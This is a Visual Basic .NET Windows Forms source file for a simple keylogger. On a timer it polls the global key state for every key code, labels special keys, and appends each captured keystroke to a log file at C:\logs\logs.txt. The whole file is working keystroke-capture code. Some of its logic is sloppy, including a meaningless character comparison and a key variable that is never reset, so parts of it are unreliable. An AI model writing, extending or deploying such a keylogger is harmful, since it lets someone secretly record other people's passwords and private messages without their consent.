Imports System.IO
Imports System.Windows.Forms
Imports System.Runtime.InteropServices

Public Class Form1


    <DllImport("user32.dll")>
    Shared Function GetAsyncKeyState(ByVal vKey As System.Windows.Forms.Keys) As Short
    End Function
    Private Sub TimerKeys_Tick(sender As Object, e As EventArgs) Handles TimerKeys.Tick
        Dim key As String
        Dim i As Integer
        Dim result As Integer
        For i = 8 To 255
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                result = 0
                If i = 8 Then
                    TextBox1.Text = "[BACKSPACE]"
                    Button1.PerformClick()
                ElseIf My.Computer.Keyboard.ShiftKeyDown AndAlso Chr(i) = "33"
                    TextBox1.Text = "!"
                    Button1.PerformClick()
                ElseIf i = 9 Then
                    TextBox1.Text = "[TAB]"
                    Button1.PerformClick()
                ElseIf i = 13 Then
                    TextBox1.Text = "[ENTER]"
                    Button1.PerformClick()
                ElseIf i = 16 Then
                    TextBox1.Text = "[SHIFT]"
                    Button1.PerformClick()
                ElseIf i = 17 Then
                    TextBox1.Text = "[CTRL]"
                    Button1.PerformClick()
                ElseIf i = 18 Then
                    TextBox1.Text = "[ALT]"
                    Button1.PerformClick()
                ElseIf i = 20 Then
                    TextBox1.Text = "[CAPS LOCK]"
                ElseIf i = 27 Then
                    TextBox1.Text = "[ESCAPE]"
                    Button1.PerformClick()
                ElseIf i = 33 Then
                    TextBox1.Text = "[PAGE UP]"
                    Button1.PerformClick()
                ElseIf i = 34 Then
                    TextBox1.Text = "[PAGE DOWN]"
                    Button1.PerformClick()
                ElseIf i = 35 Then
                    TextBox1.Text = "[END]"
                    Button1.PerformClick()
                ElseIf i = 36 Then
                    TextBox1.Text = "[HOME]"
                    Button1.PerformClick()
                ElseIf i = 37 Then
                    TextBox1.Text = "[KEY LEFT]"
                    Button1.PerformClick()
                ElseIf i = 38 Then
                    TextBox1.Text = "[KEY UP]"
                    Button1.PerformClick()
                ElseIf i = 39 Then
                    TextBox1.Text = "[KEY RIGHT]"
                    Button1.PerformClick()
                ElseIf i = 40 Then
                    TextBox1.Text = "[KEY DOWN]"
                    Button1.PerformClick()
                ElseIf i = 46 Then
                    TextBox1.Text = "[DELETE]"
                    Button1.PerformClick()
                ElseIf i = 186 Then
                    TextBox1.Text = ";"
                    Button1.PerformClick()
                ElseIf i = 187 Then
                    TextBox1.Text = "="
                    Button1.PerformClick()
                ElseIf i = 188 Then
                    TextBox1.Text = ","
                    Button1.PerformClick()
                ElseIf i = 189 Then
                    TextBox1.Text = "-"
                    Button1.PerformClick()
                ElseIf i = 190 Then
                    TextBox1.Text = "."
                    Button1.PerformClick()
                ElseIf i = 191 Then
                    TextBox1.Text = "/"
                    Button1.PerformClick()
                ElseIf i = 192 Then
                    TextBox1.Text = "`"
                    Button1.PerformClick()
                ElseIf i = 219 Then
                    TextBox1.Text = "["
                    Button1.PerformClick()
                ElseIf i = 220 Then
                    TextBox1.Text = "\"
                    Button1.PerformClick()
                ElseIf i = 221 Then
                    TextBox1.Text = "]"
                    Button1.PerformClick()
                ElseIf i = 222 Then
                    TextBox1.Text = "'"
                    Button1.PerformClick()
                Else
                    key = Chr(i)
                    TextBox1.Text = key
                End If

            End If

        Next i


        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                TextBox1.Text = key
                Button1.PerformClick()

            Else
                TextBox1.Text = key.ToLower
                Button1.PerformClick()
            End If
        End If

    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim n As FileStream
        Dim writefile As StreamWriter

        n = New FileStream("C:\logs\logs.txt", FileMode.Append, FileAccess.Write)

        writefile = New StreamWriter(n)
        writefile.Write(TextBox1.Text)
        writefile.Close()
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub
End Class
